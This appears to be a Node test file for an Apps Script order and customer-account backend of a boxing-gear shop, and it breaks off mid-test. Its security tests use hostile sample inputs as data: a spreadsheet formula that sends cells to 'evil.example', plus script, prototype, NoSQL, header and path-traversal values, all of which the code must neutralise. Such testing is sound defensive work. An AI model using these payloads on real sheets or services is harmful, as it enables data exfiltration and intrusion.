// Tests for order-apps-script.gs against the in-memory Apps Script stand-in (gas-mock.js).
// Run: node _ops/test-backend.js
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { makeEnv } = require('./gas-mock');

const KEY = 'kobg-test-admin-key-0123456789';
const RB11 = 'gants-de-sac-rival-rb11-evolution-noir';          // 1750 DH, sizes M L XL
const RB10 = 'gants-de-sac-rival-rb10-intelli-shock-blanc';     // 2390 DH, sizes S M L XL
const RS11 = 'gants-de-sparring-rival-rs11v-evolution-or';      // 2005 DH, sizes incl. "16 oz-s"
const BODY = 'protecteur-corporel-rival-neon';                  // 4559 DH, no size

let seq = 0;
function order(extra = {}) {
  seq += 1;
  return Object.assign({
    orderId: 'KOBG-261027-' + 'ABCDEFGH'[seq % 8] + 'B2' + 'CDEFGHJK'[(seq >> 3) % 8],
    nom: 'Yassine El Amrani', telephone: '06 12 34 56 ' + String(seq % 100).padStart(2, '0'), ville: 'Casablanca',
    items: [{ id: RB11 + '--m', qty: 1, unitPrice: 1750 }], subtotal: 1750, total: 1775, promoCode: '', source: 'panier',
  }, extra);
}
const env0 = (o) => makeEnv(Object.assign({ props: { ADMIN_KEY: KEY } }, o));
const rowsOf = (env, name) => env.sheets[name].rows;
const formulas = (env) => Object.values(env.sheets).flatMap((s) => s.rows.flat()).filter((v) => v && typeof v === 'object' && v.formula);

test('health check answers with the version', () => {
  const r = env0().get();
  assert.equal(r.ok, true);
  assert.ok(r.version);
});

test('valid order is stored with server prices, Gestion line and phone as text', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 2, unitPrice: 1750 }, { id: BODY, qty: 1, unitPrice: 4559 }], total: 8059 }));
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.subtotal, 8059);
  assert.equal(r.delivery, 0);                                   // >= 2000 DH: free
  assert.equal(r.total, 8059);
  assert.equal(r.adjusted, false);
  assert.equal(r.items[0].name, 'Gants de sac Rival RB11 Evolution');
  assert.equal(r.items[0].size, 'M');
  const rows = rowsOf(env, 'Commandes');
  assert.equal(rows[0][1], 'N° commande');
  const v = rows[1];
  assert.equal(v[1], r.orderId);
  assert.equal(typeof v[3], 'string');
  assert.match(v[3], /^06\d{8}$/);                               // leading 0 kept
  assert.equal(v[5], 'Gants de sac Rival RB11 Evolution x2 / Protecteur corporel Rival');
  assert.equal(v[6], 'M / ');
  assert.equal(v[7], 'Noir / Neon');
  assert.equal(v[8], 3);
  const g = rowsOf(env, 'Gestion');
  assert.deepEqual(g[0].slice(0, 5), ['N° commande', 'Statut', 'Note interne', 'Mis à jour le', 'Historique']);
  assert.equal(g[1][0], r.orderId);
  assert.equal(g[1][1], 'Nouvelle');
});

test('single cheap item pays delivery; promo code applies 10 %', () => {
  const env = env0();
  const a = env.post(order());
  assert.equal(a.total, 1775);
  const b = env.post(order({ promoCode: 'kobg26', total: 1600 }));
  assert.equal(b.discountPct, 10);
  assert.equal(b.discount, 175);
  assert.equal(b.total, 1750 - 175 + 25);
  assert.equal(b.promoCode, 'KOBG26');
});

test('tampered prices and totals are recomputed and flagged', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB10 + '--l', qty: 1, unitPrice: 1, lineTotal: 1 }], subtotal: 1, total: 26 }));
  assert.equal(r.ok, true);
  assert.equal(r.total, 2390);
  assert.equal(r.adjusted, true);
  const g = rowsOf(env, 'Gestion')[1];
  assert.match(g[2], /Total recalculé/);
  assert.equal(rowsOf(env, 'Commandes')[1][13], 2390);
});

test('fake promo codes and prototype keys give no discount', () => {
  const env = env0();
  for (const code of ['FREE100', 'constructor', '__proto__', 'toString']) {
    const r = env.post(order({ promoCode: code }));
    assert.equal(r.ok, true);
    assert.equal(r.discountPct, 0, code);
    assert.equal(r.total, 1775, code);
  }
});

test('unknown products, bad sizes and odd quantities are refused', () => {
  const env = env0();
  const bad = [
    [{ id: 'gants-imaginaires', qty: 1 }], [{ id: 'constructor', qty: 1 }], [{ id: RB11, qty: 1 }],
    [{ id: RB11 + '--s', qty: 1 }], [{ id: BODY + '--m', qty: 1 }], [{ id: RB11 + '--m', qty: 0 }],
    [{ id: RB11 + '--m', qty: 1.5 }], [{ id: RB11 + '--m', qty: 100 }], [{ id: '<script>', qty: 1 }], [], 'x',
    Array.from({ length: 31 }, () => ({ id: BODY, qty: 1 })),
  ];
  for (const items of bad) {
    const r = env.post(order({ items }));
    assert.equal(r.ok, false, JSON.stringify(items).slice(0, 80));
    assert.match(r.error, /^bad_(item|order)$/);
  }
  assert.equal(env.sheets.Commandes, undefined);                 // nothing written
  const ok = env.post(order({ items: [{ id: RS11 + '--16-oz-s', qty: 1 }] }));
  assert.equal(ok.ok, true);
  assert.equal(ok.items[0].size, '16 oz-s');
});

test('same line twice is merged; more than 200 units refused', () => {
  const env = env0();
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 2 }, { id: RB11 + '--m', qty: 3 }] }));
  assert.equal(r.items.length, 1);
  assert.equal(r.items[0].qty, 5);
  const big = env.post(order({ items: [RB11 + '--m', RB11 + '--l', RB11 + '--xl'].map((id) => ({ id, qty: 99 })) }));
  assert.equal(big.error, 'bad_order');
});

test('customer fields are validated', () => {
  const env = env0();
  assert.equal(env.post(order({ nom: 'A' })).field, 'nom');
  assert.equal(env.post(order({ nom: '12345' })).field, 'nom');
  assert.equal(env.post(order({ ville: ' ' })).field, 'ville');
  assert.equal(env.post(order({ telephone: '0512345678' })).field, 'telephone');
  assert.equal(env.post(order({ telephone: '+33612345678' })).field, 'telephone');
  assert.equal(env.post(order({ telephone: '+212 7 12 34 56 78' })).ok, true);
});

test('formula injection never reaches the sheet as a formula', () => {
  const env = env0();
  const r = env.post(order({ nom: '=IMPORTDATA("https://evil.example/?"&A1:A99)', ville: '+HYPERLINK("x")', telephone: '0611111111' }));
  assert.equal(r.ok, true);
  assert.deepEqual(formulas(env), []);
  assert.match(rowsOf(env, 'Commandes')[1][2], /^=IMPORTDATA/);  // kept as plain text
  // admin notes too
  const n = env.post({ action: 'update', key: KEY, id: r.orderId, note: '@SUM(A1)' });
  assert.equal(n.ok, true);
  assert.deepEqual(formulas(env), []);
});

test('control characters and huge strings are cleaned and capped', () => {
  const env = env0();
  const r = env.post(order({ nom: 'Sara\u0000\u202e Bennani\r\n' + 'x'.repeat(500), ville: 'Fès\t\t' }));
  assert.equal(r.ok, true);
  const v = rowsOf(env, 'Commandes')[1];
  assert.ok(v[2].length <= 80);
  assert.ok(!/[\u0000-\u001f\u202e]/.test(v[2]));
  assert.equal(v[4], 'Fès');
});

test('a double submit is stored once; a colliding id from another phone gets a new id', () => {
  const env = env0();
  const o = order();
  const a = env.post(o);
  const b = env.post(o);
  assert.equal(b.ok, true);
  assert.equal(b.duplicate, true);
  assert.equal(b.total, a.total);
  assert.equal(rowsOf(env, 'Commandes').length, 2);
  const c = env.post(Object.assign({}, o, { telephone: '0699999999' }));
  assert.equal(c.ok, true);
  assert.notEqual(c.orderId, a.orderId);
  assert.match(c.orderId, /^KOBG-\d{6}-[A-Z0-9]{4}$/);
});

test('rate limits: 5 orders per phone per hour, 40 per 10 minutes overall', () => {
  const env = env0();
  for (let i = 0; i < 5; i++) assert.equal(env.post(order({ telephone: '0700000001' })).ok, true);
  assert.equal(env.post(order({ telephone: '0700000001' })).error, 'too_many');
  env.cache.clear();
  for (let i = 0; i < 40; i++) assert.equal(env.post(order({ telephone: '06000000' + String(i).padStart(2, '0') })).ok, true);
  assert.equal(env.post(order({ telephone: '0711111111' })).error, 'busy');
});

test('garbage requests are refused without a stack trace', () => {
  const env = env0();
  for (const body of ['', 'not json', '[]', 'null', '"x"', 'x'.repeat(40000)]) {
    const r = env.post(body);
    assert.equal(r.ok, false);
    assert.equal(r.error, 'bad_request');
  }
});

test('catalog unreachable: order kept, client price flagged; last good copy used when known', () => {
  const env = env0({ fetchFail: true });
  const r = env.post(order({ items: [{ id: RB11 + '--m', qty: 1, unitPrice: 1750, name: 'Gants / X', size: 'M', colour: 'Noir' }] }));
  assert.equal(r.ok, true);
  assert.equal(r.adjusted, true);
  assert.match(rowsOf(env, 'Gestion')[1][2], /NON vérifiés/);
  assert.equal(r.items[0].name, 'Gants/X');                      // separator can't break the columns
  const env2 = env0();
  env2.post(order());                                            // fetch works: last good copy saved
  env2.cache.clear();
  env2.fetchFail = true;
  const r2 = env2.post(order({ items: [{ id: RB10 + '--s', qty: 1, unitPrice: 5 }] }));
  assert.equal(r2.total, 2390);
  assert.equal(r2.adjusted, true);
});

test('admin: key missing / too short', () => {
  assert.equal(makeEnv().post({ action: 'auth', key: 'x' }).error, 'no_admin_key');
  const r = makeEnv({ props: { ADMIN_KEY: 'short' } }).post({ action: 'auth', key: 'short' });
  assert.equal(r.error, 'no_admin_key');
  assert.equal(r.reason, 'short');
});

test('admin: wrong keys count down, then lock; signed sessions still work during a lock', () => {
  const env = env0();
  const session = env.post({ action: 'auth', key: KEY, remember: true }).token;
  assert.match(session, /^v1\.\d{10}\./);
  for (let left = 4; left >= 1; left--) {
    const r = env.post({ action: 'auth', key: 'wrong' + left });
    assert.equal(r.error, 'bad_key');
    assert.equal(r.left, left);
  }
  assert.equal(env.post({ action: 'auth', key: 'wrong0' }).error, 'locked');
  assert.equal(env.post({ action: 'list', key: KEY }).error, 'locked');          // the key can't be tried while locked
  assert.equal(env.post({ action: 'list', key: session }).ok, true);             // the owner keeps working
  assert.equal(env.post({ action: 'list', key: 'v1.9999999999.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' }).error, 'locked');
});

test('admin: tokens are signed, expire, and die with the key', () => {
  const env = env0();
  const tok = env.post({ action: 'auth', key: KEY }).token;
  assert.notEqual(tok, KEY);
  assert.equal(env.post({ action: 'list', key: tok }).ok, true);
  const [, exp, sig] = tok.split('.');
  assert.equal(env.post({ action: 'list', key: 'v1.' + (Number(exp) + 999999) + '.' + sig }).error, 'bad_key');   // forged expiry
  const old = 'v1.' + (Math.floor(Date.now() / 1000) - 10) + '.' + env.ctx.sign_(KEY, String(Math.floor(Date.now() / 1000) - 10));
  assert.equal(env.post({ action: 'list', key: old }).error, 'expired');
  env.props.set('ADMIN_KEY', 'a-brand-new-admin-key-123');
  assert.equal(env.post({ action: 'list', key: tok }).error, 'bad_key');
});

test('admin: list returns what admin.js renders; update changes status, history and note', () => {
  const env = env0();
  const a = env.post(order({ items: [{ id: RS11 + '--14-oz', qty: 2 }, { id: BODY, qty: 1 }], promoCode: 'KOBG26' }));
  assert.equal(env.post({ action: 'list', key: 'nope' }).error, 'bad_key');
  const tok = env.post({ action: 'auth', key: KEY }).token;
  const l = env.post({ action: 'list', key: tok });
  assert.equal(l.ok, true);
  assert.match(l.today, /^\d{4}-\d{2}-\d{2}$/);
  const o = l.orders[0];
  for (const k of ['row', 'id', 'ts', 'recu', 'day', 'nom', 'tel', 'ville', 'articles', 'taille', 'couleur', 'nb', 'sousTotal', 'promo', 'remise', 'livraison', 'total', 'statut', 'note', 'maj', 'hist']) assert.ok(k in o, k);
  assert.equal(o.id, a.orderId);
  assert.equal(o.day, l.today);
  assert.match(o.recu, /^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}$/);
  assert.match(o.tel, /^0\d{9}$/);
  assert.equal(o.articles, 'Gants de sparring Rival RS11V Evolution x2 / Protecteur corporel Rival');
  assert.equal(o.taille, '14 oz / ');
  assert.equal(o.remise, 10);
  assert.equal(o.total, a.total);
  assert.equal(o.statut, 'Nouvelle');
  assert.equal(o.hist[0].by, 'site');

  assert.equal(env.post({ action: 'update', key: tok, id: o.id, status: 'Volée' }).error, 'bad_status');
  assert.equal(env.post({ action: 'update', key: tok, id: 'KOBG-000000-XXXX', status: 'Livrée' }).error, 'not_found');
  assert.equal(env.post({ action: 'drop', key: tok }).error, 'bad_action');
  const u = env.post({ action: 'update', key: tok, id: o.id, status: 'Confirmée' });
  assert.equal(u.ok, true);
  assert.equal(u.order.statut, 'Confirmée');
  assert.deepEqual(u.order.hist.slice(-1)[0].to, 'Confirmée');
  const n = env.post({ action: 'update', key: tok, id: o.id, note: 'Rappeler après 18 h\nportail bleu' });
  assert.equal(n.order.note, 'Rappeler après 18 h\nportail bleu');
  const l2 = env.post({ action: 'list', key: tok });
  assert.equal(l2.orders[0].statut, 'Confirmée');
  const s = env.post({ action: 'stats', key: tok, period: 'all' });
  assert.equal(s.stats.commandes, 1);
  assert.equal(s.stats.caAEncaisser, a.total);
});

test('admin: works with an older Gestion tab and old rows', () => {
  const env = env0();
  env.post(order());
  const g = env.sheets.Gestion;
  g.rows = [['Commande', 'Etat', 'Notes']];                        // older layout, other names
  const c = env.sheets.Commandes;
  c.rows.push(['27/10/2026 09:15', 'KOBG-261027-OLD1', 'Ancien Client', 612345678, 'Rabat', 'Gants de sac Rival RB11 Evolution', 'L', 'Noir', 1, 1750, '', 0, 25, 1775]);
  g.rows.push(['KOBG-261027-OLD1', 'Expédiée', 'déjà parti']);
  const l = env.post({ action: 'list', key: KEY });
  assert.equal(l.ok, true, JSON.stringify(l));
  const old = l.orders.find((o) => o.id === 'KOBG-261027-OLD1');
  assert.equal(old.statut, 'Expédiée');
  assert.equal(old.note, 'déjà parti');
  assert.equal(old.tel, '0612345678');
  assert.equal(old.recu, '27/10/2026 09:15');
  assert.ok(old.ts > 0);
  const u = env.post({ action: 'update', key: KEY, id: 'KOBG-261027-OLD1', status: 'Livrée' });
  assert.equal(u.order.statut, 'Livrée');
  assert.equal(g.rows[0][0], 'Commande');                          // existing header kept
});

test('notification e-mail when NOTIFY_EMAIL is set, never blocks the order', () => {
  const env = env0({ props: { ADMIN_KEY: KEY, NOTIFY_EMAIL: 'shop@example.org' } });
  const r = env.post(order({ ville: 'Tanger\r\nBcc: x@y.z' }));
  assert.equal(r.ok, true);
  assert.equal(env.mails.length, 1);
  assert.match(env.mails[0].subject, new RegExp(r.orderId));
  assert.ok(!/[\r\n]/.test(env.mails[0].subject));
  env.ctx.MailApp.sendEmail = () => { throw new Error('quota'); };
  assert.equal(env.post(order()).ok, true);
});

test('setup() and generateAdminKey() from the editor', () => {
  const env = makeEnv();
  env.run('generateAdminKey');
  assert.ok(env.props.get('ADMIN_KEY').length >= 32);
  env.run('setup');
  assert.ok(env.sheets.Commandes && env.sheets.Gestion);
  assert.ok(env.logs.some((l) => /ADMIN_KEY configurée/.test(l)));
});

// ===================== customer accounts =====================
const crypto = require('crypto');
const PW = 'Gants-Rouges-2026';
let acctSeq = 0;
function signup(env, extra = {}) {
  acctSeq += 1;
  return env.post(Object.assign({ action: 'register', nom: 'Salma Bennani', email: `salma${acctSeq}@example.ma`,
    telephone: '0661 22 33 ' + String(acctSeq % 100).padStart(2, '0'), password: PW }, extra));
}
const sessionsOf = (env, uid) => [...env.props.entries()].filter(([k, v]) => k.startsWith('ses:') && JSON.parse(v).u === uid);
const resetLink = (mail) => /compte\.html#reset=(k1\.[A-Za-z0-9_-]{43})/.exec(mail.body)[1];

test('accounts: PBKDF2 matches the reference implementation (Node crypto)', () => {
  const env = makeEnv();
  const salt = '00112233445566778899aabbccddeeff';
  for (const [pw, n] of [['motdepasse', 1], ['Gants-Rouges-2026', 2], ['éàç 😀 mot', 1000]]) {
    assert.equal(env.ctx.pbkdf2_(pw, salt, n), crypto.pbkdf2Sync(Buffer.from(pw, 'utf8'), Buffer.from(salt, 'hex'), n, 32, 'sha256').toString('hex'), pw);
  }
});

test('accounts: register stores a salted hash (never the password) and signs in', () => {
  const env = env0();
  const r = signup(env, { email: '  Salma.B@Example.MA ', adresse: '12 rue Ibn Battouta, Maarif', ville: 'Casablanca' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.match(r.session, /^k1\.[A-Za-z0-9_-]{43}$/);
  assert.ok(r.exp > Date.now() + 29 * 864e5);
  assert.deepEqual(Object.keys(r.profile).sort(), ['adresse', 'depuis', 'email', 'id', 'nom', 'telephone', 'ville']);
  assert.equal(r.profile.email, 'salma.b@example.ma');
  assert.match(r.profile.telephone, /^06\d{8}$/);
  const rows = rowsOf(env, 'Clients');
  assert.deepEqual(rows[0], ['ID client', 'E-mail', 'Nom', 'Téléphone', 'Adresse', 'Ville', 'Créé le', 'Mis à jour le', 'Dernière connexion', 'Sel', 'Empreinte', 'Itérations']);
  const v = rows[1];
  assert.ok(!JSON.stringify(rows).includes(PW));                         // never in clear
  assert.match(v[9], /^[0-9a-f]{32}$/);                                   // salt kept as text
  assert.match(v[10], /^[0-9a-f]{64}$/);
  assert.ok(v[11] >= 1000);
  assert.equal(env.ctx.pbkdf2_(PW, v[9], v[11]), v[10]);
  assert.equal(typeof v[3], 'string');
  // the session is stored hashed: the token itself is nowhere on the server
  assert.ok(![...env.props.keys(), ...env.props.values()].some((x) => x.includes(r.session)));
  assert.equal(sessionsOf(env, r.profile.id).length, 1);
  const short = signup(env, { remember: false });
  assert.ok(short.exp < Date.now() + 2 * 864e5);
});

test('accounts: register validates fields, weak passwords and duplicates', () => {
  const env = env0();
  assert.equal(signup(env, { email: 'pas-un-email' }).field, 'email');
  assert.equal(signup(env, { email: 'a@b' }).field, 'email');
  assert.equal(signup(env, { nom: 'A' }).field, 'nom');
  assert.equal(signup(env, { telephone: '0512' }).field, 'telephone');
  assert.equal(signup(env, { password: 'court' }).error, 'weak_password');
  assert.equal(signup(env, { password: '12345678' }).error, 'weak_password');
  assert.equal(signup(env, { password: 'aaaaaaaaaa' }).error, 'weak_password');
  assert.equal(signup(env, { email: 'moi@example.ma', password: 'MOI@example.ma' }).error, 'weak_password');
  assert.equal(signup(env, { password: 'x'.repeat(129) }).error, 'bad_field');
  assert.equal(signup(env, { password: 12345678 }).error, 'weak_password');
  assert.equal(signup(env, { email: 'dup@example.ma' }).ok, true);
  const d = signup(env, { email: 'DUP@example.ma' });
  assert.equal(d.error, 'email_taken');
  assert.equal(rowsOf(env, 'Clients').length, 2);
});

test('accounts: profile fields never reach the sheet as formulas', () => {
  const env = env0();
  const r = signup(env, { nom: '=HYPERLINK("http://x","clic") Nom', adresse: '+SUM(A1:A9)', ville: '@Fès', email: '=x@example.ma' });
  assert.equal(r.ok, true, JSON.stringify(r));
  const u = env.post({ action: 'update_profile', session: r.session, adresse: '-1+2 rue\u0000 X', nom: '@Salma Ben' });
  assert.equal(u.ok, true, JSON.stringify(u));
  assert.deepEqual(formulas(env), []);
  assert.equal(rowsOf(env, 'Clients')[1][4], '-1+2 rue X');
});

test('accounts: login with one generic error, lock after 5 wrong passwords (known or unknown e-mail)', () => {
  const env = env0();
  const r = signup(env, { email: 'karim@example.ma' });
  const ok = env.post({ action: 'login', email: 'KARIM@example.ma', password: PW });
  assert.equal(ok.ok, true);
  assert.equal(ok.profile.id, r.profile.id);
  assert.notEqual(ok.session, r.session);
  const wrong = env.post({ action: 'login', email: 'karim@example.ma', password: 'mauvais-mot' });
  const ghost = env.post({ action: 'login', email: 'personne@example.ma', password: 'mauvais-mot' });
  assert.deepEqual(Object.keys(wrong).sort(), Object.keys(ghost).sort());
  assert.equal(wrong.error, 'bad_login');
  assert.equal(ghost.error, 'bad_login');
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma' }).error, 'bad_login');
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: { $ne: 1 } }).error, 'bad_login');
  for (let i = 0; i < 3; i++) assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: 'x' + i }).error, 'bad_login');
  const locked = env.post({ action: 'login', email: 'karim@example.ma', password: 'encore-faux' });
  assert.equal(locked.error, 'locked');
  assert.ok(locked.retryIn > 0);
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: PW }).error, 'locked');   // even the right one
  for (let i = 0; i < 4; i++) env.post({ action: 'login', email: 'personne@example.ma', password: 'x' + i });
  assert.equal(env.post({ action: 'login', email: 'personne@example.ma', password: 'y' }).error, 'locked');  // same for unknown
  assert.equal(env.post({ action: 'login', email: 'autre@example.ma', password: 'y' }).error, 'bad_login');  // per e-mail
  env.cache.clear();
  assert.equal(env.post({ action: 'login', email: 'karim@example.ma', password: PW }).ok, true);
});

test('accounts: sessions — me, bad/expired/forged tokens, logout, cap per account', () => {
  const env = env0();
  const r = signup(env);
  assert.equal(env.post({ action: 'me', session: r.session }).profile.email, r.profile.email);
  for (const bad of [undefined, '', 'k1.' + 'A'.repeat(43), r.session + 'x', 'v1.123.abc', { a: 1 }]) {
    assert.equal(env.post({ action: 'me', session: bad }).error, 'auth', String(bad));
  }
  const [key, val] = sessionsOf(env, r.profile.id)[0];
  env.props.set(key, JSON.stringify(Object.assign(JSON.parse(val), { exp: Date.now() - 1 })));
  assert.equal(env.post({ action: 'me', session: r.session }).error, 'auth');
  assert.equal(env.props.has(key), false);                                 // expired: deleted
  const l = env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(env.post({ action: 'logout', session: l.session }).ok, true);
  assert.equal(env.post({ action: 'me', session: l.session }).error, 'auth');
  // "every device": all sessions of this account end, another account's stay
  const other = signup(env, { email: 'autre@example.ma' });
  const d1 = env.post({ action: 'login', email: r.profile.email, password: PW });
  const d2 = env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(env.post({ action: 'logout', session: d1.session, all: true }).ok, true);
  assert.equal(env.post({ action: 'me', session: d2.session }).error, 'auth');
  assert.equal(sessionsOf(env, r.profile.id).length, 0);
  assert.equal(env.post({ action: 'me', session: other.session }).ok, true);
  assert.equal(env.post({ action: 'logout', session: d1.session, all: true }).ok, true);   // already gone: still ok
  for (let i = 0; i < 12; i++) env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(sessionsOf(env, r.profile.id).length, 10);
  // account removed from the sheet by the team: its sessions die
  const last = env.post({ action: 'login', email: r.profile.email, password: PW });
  env.sheets.Clients.deleteRow(2);
  assert.equal(env.post({ action: 'me', session: last.session }).error, 'auth');
  assert.equal(env.post({ action: 'my_orders' }).error, 'auth');
});

test('accounts: update profile and saved delivery address', () => {
  const env = env0();
  const r = signup(env);
  const u = env.post({ action: 'update_profile', session: r.session, nom: 'Salma Bennani-Alaoui', telephone: '+212 7 00 11 22 33',
    adresse: 'Résidence Al Andalous, apt 4\n2e étage', ville: 'Marrakech' });
  assert.equal(u.ok, true, JSON.stringify(u));
  assert.equal(u.profile.telephone, '0700112233');
  assert.equal(u.profile.adresse, 'Résidence Al Andalous, apt 4 2e étage');
  assert.equal(u.profile.email, r.profile.email);
  assert.equal(env.post({ action: 'update_profile', session: r.session, email: 'pirate@x.ma' }).profile.email, r.profile.email);
  assert.equal(env.post({ action: 'update_profile', session: r.session, telephone: '123' }).field, 'telephone');
  assert.equal(env.post({ action: 'update_profile', session: r.session, nom: '' }).field, 'nom');
  assert.equal(env.post({ action: 'update_profile', session: r.session, adresse: 'x'.repeat(500) }).profile.adresse.length, 200);
  assert.equal(env.post({ action: 'me', session: r.session }).profile.ville, 'Marrakech');
});

test('accounts: change password checks the current one and signs out other devices', () => {
  const env = env0();
  const r = signup(env);
  const other = env.post({ action: 'login', email: r.profile.email, password: PW });
  assert.equal(env.post({ action: 'change_password', session: r.session, current: 'faux', password: 'Nouveau-Pass-99' }).error, 'bad_password');
  assert.equal(env.post({ action: 'change_password', session: r.session, current: PW, password: 'court' }).error, 'weak_password');
  const c = env.post({ action: 'change_password', session: r.session, current: PW, password: 'Nouveau-Pass-99' });
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.equal(env.post({ action: 'me', session: r.session }).ok, true);    // this device stays signed in
  assert.equal(env.post({ action: 'me', session: other.session }).error, 'auth');
  assert.equal(env.post({ action: 'login', email: r.profile.email, password: PW }).error, 'bad_login');
  assert.equal(env.post({ action: 'login', email: r.profile.email, password: 'Nouveau-Pass-99' }).ok, true);
});

test('accounts: older, weaker hashes are upgraded at the next login', () => {
  const env = env0();
  const r = signup(env);
  const row = rowsOf(env, 'Clients')[1];
  const target = row[11];
  row[9] = 'ffeeddccbbaa99887766554433221100';
  row[10] = env.ctx.pbkdf2_(PW, row[9], 10);
  row[11] = 10;
  assert.equal(env.post({ action: 'login', email: r.profile.email, password: PW }).ok, true);
  assert.equal(row[11], target);
  assert.notEqual(row[9], 'ffeeddccbbaa99887766554433221100');
  assert.equal(env.ctx.pbkdf2_(PW, row[9], row[11]), row[10]);
});

test('accounts: orders placed while signed in are linked; history shows only my orders and statuses', () => {
  const env = env0();
  const a = signup(env), b = signup(env);
  const o1 = env.post(order({ session: a.session }));
  const o2 = env.post(order({ session: a.session, items: [{ id: BODY, qty: 1 }], promoCode: 'KOBG26' }));
  const ob = env.post(order({ session: b.session }));
  const guest = env.post(order());
  const stale = env.post(order({ session: 'k1.' + 'B'.repeat(43) }));
  assert.equal(o1.linked, true);
  assert.equal(guest.linked, false);
  assert.equal(stale.ok, true);                                             // a stale token never blocks an order
  assert.equal(stale.linked, false);
  const c = rowsOf(env, 'Commandes');
  assert.equal(c[0][14], 'Compte client');
  assert.equal(c.find((v) => v[1] === o1.orderId)[14], a.profile.id);
  assert.equal(c.find((v) => v[1] === guest.orderId)[14] || '', '');
  assert.match(rowsOf(env, 'Gestion').find((v) => v[0] === o1.orderId)[2], new RegExp('Client connecté : ' + a.profile.email.replace('.', '\\.')));

  const tok = env.post({ action: 'auth', key: KEY }).token;
  env.post({ action: 'update', key: tok, id: o1.orderId, status: 'Confirmée' });
  env.post({ action: 'update', key: tok, id: o1.orderId, status: 'Expédiée', note: 'SECRET interne : client difficile' });
  const mine = env.post({ action: 'my_orders', session: a.session });
  assert.equal(mine.ok, true);
  assert.deepEqual(mine.orders.map((o) => o.id).sort(), [o1.orderId, o2.orderId].sort());
  const m1 = mine.orders.find((o) => o.id === o1.orderId);
  assert.equal(m1.statut, 'Expédiée');
  assert.deepEqual(m1.suivi.map((h) => h.to), ['Nouvelle', 'Confirmée', 'Expédiée']);
  assert.deepEqual(m1.items, [{ name: 'Gants de sac Rival RB11 Evolution', qty: 1, size: 'M', colour: 'Noir' }]);
  assert.equal(m1.total, 1775);
  assert.ok(!JSON.stringify(mine).includes('SECRET'));
  assert.ok(!JSON.stringify(mine).includes('Client connecté'));
  const m2 = mine.orders.find((o) => o.id === o2.orderId);
  assert.equal(m2.promo, 'KOBG26');
  assert.equal(env.post({ action: 'my_orders', session: b.session }).orders.map((o) => o.id).join(), ob.orderId);
  assert.equal(env.post({ action: 'list', key: tok }).orders.length, 5);   // admin still sees every order
});

test('accounts: the account column goes after any extra column of an older Commandes tab', () => {
  const env = env0();
  env.post(order());
  const c = env.sheets.Commandes;
  c.rows[0][14] = 'Remarque';
  const a = signup(env);
  const o = env.post(order({ session: a.session }));
  assert.equal(c.rows[0][15], 'Compte client');
  assert.equal(c.rows.find((v) => v[1] === o.orderId)[15], a.profile.id);
  assert.equal(env.post({ action: 'my_orders', session: a.session }).orders.length, 1);
});

test('accounts: password reset by e-mail — same answer for unknown e-mails, single-use 1 h link', () => {
  const env = env0();
  const r = signup(env, { email: 'nadia@example.ma' });
  const other = env.post({ action: 'login', email: 'nadia@example.ma', password: PW });
  const unknown = env.post({ action: 'reset_request', email: 'inconnu@example.ma' });
  const known = env.post({ action: 'reset_request', email: 'Nadia@example.ma' });
  assert.deepEqual(Object.keys(unknown).sort(), Object.keys(known).sort());
  assert.equal(unknown.ok, true);
  assert.equal(env.mails.length, 1);
  const m = env.mails[0];
  assert.equal(m.to, 'nadia@example.ma');
  assert.ok(!/[\r\n]/.test(m.subject));
  assert.match(m.body, /https:\/\/slahmaid\.github\.io\/KOBG\/compte\.html#reset=k1\./);
  assert.ok(!m.body.includes(PW));
  const tok = resetLink(m);
  assert.ok(![...env.props.keys(), ...env.props.values()].some((x) => x.includes(tok)));   // stored hashed
  assert.equal(env.post({ action: 'reset_confirm', token: tok, password: 'court' }).error, 'weak_password');
  const c = env.post({ action: 'reset_confirm', token: tok, password: 'Nouveau-Depart-7' });
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.equal(env.post({ action: 'me', session: c.session }).ok, true);
  assert.equal(env.post({ action: 'me', session: r.session }).error, 'auth');       // every old session revoked
  assert.equal(env.post({ action: 'me', session: other.session }).error, 'auth');
  assert.equal(env.post({ action: 'reset_confirm', token: tok, password: 'Encore-Autre-8' }).error, 'bad_reset');  // single use
  assert.equal(env.post({ action: 'login', email: 'nadia@example.ma', password: 'Nouveau-Depart-7' }).ok, true);
  assert.equal(env.post({ action: 'reset_confirm', token: 'k1.' + 'C'.repeat(43), password: 'Nouveau-Depart-7' }).error, 'bad_reset');
  assert.equal(env.post({ action: 'reset_confirm', token: '../etc', password: 'Nouveau-Depart-7' }).error, 'bad_reset');
});

test('accounts: reset links expire, only the newest works, and a reset unlocks the account', () => {
  const env = env0();
  signup(env, { email: 'omar@example.ma' });
  for (let i = 0; i < 5; i++) env.post({ action: 'login', email: 'omar@example.ma', password: 'faux' + i });
  assert.equal(env.post({ action: 'login', email: 'omar@example.ma', password: PW }).error, 'locked');
  env.post({ action: 'reset_request', email: 'omar@example.ma' });
  env.post({ action: 'reset_request', email: 'omar@example.ma' });
  const first = resetLink(env.mails[0]), second = resetLink(env.mails[1]);
  assert.equal(env.post({ action: 'reset_confirm', token: first, password: 'Nouveau-Depart-7' }).error, 'bad_reset');
  const [k, v] = [...env.props.entries()].find(([key]) => key.startsWith('rst:'));
  env.props.set(k, JSON.stringify(Object.assign(JSON.parse(v), { exp: Date.now() - 1 })));
  assert.equal(env.post({ action: 'reset_confirm', token: second, password: 'Nouveau-Depart-7' }).error, 'bad_reset');
  env.post({ action: 'reset_request', email: 'omar@example.ma' });
  const third = resetLink(env.mails[2]);
  assert.equal(env.post({ action: 'reset_confirm', token: third, password: 'Nouveau-Depart-7' }).ok, true);
